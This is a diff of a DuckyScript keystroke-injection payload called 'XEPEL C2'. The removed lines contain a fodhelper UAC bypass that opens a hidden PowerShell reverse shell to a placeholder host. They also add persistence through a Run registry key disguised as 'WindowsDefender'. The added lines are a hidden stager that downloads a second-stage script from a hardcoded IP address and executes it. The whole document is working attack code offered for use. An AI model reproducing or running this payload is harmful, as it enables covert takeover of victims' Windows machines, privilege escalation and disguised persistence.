@@ -1,21 +1,9 @@
-
-REM XEPEL C2 – UAC Bypass + Persistent Reverse Shell
-REM Works on Windows 10/11
-REM No visible window
+REM XEPEL C2 – Stage 1 Stager
+REM Fits comfortably in Windows Run dialog
+REM No multiline, no focus issues
 
 DELAY 2000
-
-REM ── STAGE 1: Open Run ──
 GUI r
 DELAY 1000
-
-REM ── STAGE 2: Launch elevated PowerShell via fodhelper UAC bypass ──
-STRING cmd /c start /min "" powershell -w hidden -ep bypass -nop -c "$p='HKCU:\Software\Classes\ms-settings\Shell\Open\command';New-Item -Path $p -Force;Set-ItemProperty -Path $p -Name '(default)' -Value 'cmd /c start /min powershell -w hidden -ep bypass -nop -c ""$c=New-Object Net.Sockets.TCPClient(''THE IP'',4443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+''PS ''+(pwd).Path+''> '');$s.Write($rb,0,$rb.Length);$s.Flush()}""';Set-ItemProperty -Path $p -Name 'DelegateExecute' -Value '';Start-Process fodhelper.exe;Start-Sleep 3;Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force"
-ENTER
-DELAY 5000
-
-REM ── STAGE 3: Add persistence after elevated shell connects ──
-GUI r
-DELAY 1000
-STRING cmd /c start /min "" powershell -w hidden -ep bypass -nop -c "$rp='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';$cmd='cmd /c start /min powershell -w hidden -ep bypass -nop -c ""$c=New-Object Net.Sockets.TCPClient(''YOUR_VPS_IP'',4443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+''PS ''+(pwd).Path+''> '');$s.Write($rb,0,$rb.Length);$s.Flush()}""';Set-ItemProperty -Path $rp -Name 'WindowsDefender' -Value $cmd"
+STRING powershell -w hidden -ep bypass -c "iwr -Uri http://153.75.82.198/stage2.ps1 -OutFile $env:TEMP\x.ps1; Start-Process $env:TEMP\x.ps1"
 ENTER
